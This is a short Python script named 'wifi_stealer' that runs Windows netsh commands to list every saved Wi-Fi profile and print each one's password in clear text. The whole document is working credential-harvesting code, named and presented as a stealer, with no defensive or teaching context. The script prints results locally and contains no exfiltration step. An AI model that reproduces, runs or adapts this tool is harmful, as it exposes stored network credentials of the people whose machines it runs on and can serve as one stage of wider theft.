from os import popen
from re import search

def wifi_stealer():
    try:
        job = popen("netsh wlan show profiles").readlines()
        for x in job:
            x = x.strip("\n")
            x = x.partition(":")
            x = x[2].strip()
            if search('[a-zA-Z]', x):
                getPass = popen(f'netsh wlan show profile "{x}" key=clear').readlines()
                for a in getPass:
                    a = a.strip("\n")
                    if "Conten" in a:
                        a = a.partition(": ")
                        a = a[2].strip()
                        print(f"WIFI NAME: {x}".ljust(60)+f"PASSWORD: {a}")
    except Exception as Error:
        print(str(Error))
        return

if __name__ == "__main__":
    wifi_stealer()
